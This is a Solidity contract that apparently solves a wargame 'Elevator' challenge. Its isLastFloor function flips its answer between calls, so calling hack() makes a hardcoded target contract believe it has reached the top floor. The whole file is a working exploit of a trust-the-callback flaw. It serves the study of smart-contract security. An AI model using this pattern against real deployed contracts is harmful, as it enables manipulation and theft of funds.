import "./Elevator.sol";

pragma solidity ^0.4.18;

contract Building {
    Elevator public el = Elevator(0x33382b9f8eab070385fa1a3d6e3ebfa4f731eb46);
    bool public switchFlipped =  false;

    function hack() public {
        el.goTo(1);
    }

    function isLastFloor(uint) view public returns (bool) {
        // first call
      if (! switchFlipped) {
        switchFlipped = true;
        return false;
        // second call
      } else {
        switchFlipped = false;
        return true;
      }
    }
}